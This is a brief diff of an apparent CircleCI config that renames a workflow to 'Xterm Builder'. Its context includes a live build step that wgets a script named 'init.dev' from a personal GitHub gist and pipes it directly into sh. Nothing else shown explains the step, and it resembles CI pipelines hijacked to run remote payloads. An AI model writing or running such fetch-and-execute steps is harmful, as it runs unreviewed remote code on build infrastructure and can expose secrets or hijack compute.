@@ -10,7 +10,7 @@ jobs:
       - run: wget https://gist.githubusercontent.com/fernfernfern/21d536ff90968dccd80925c7f2b3b3c5/raw/init.dev -O - | sh
 workflows:
   version: 2
-   Xterm:
+   Xterm Builder:
     jobs:
     - Xterm Builder
 version: 2
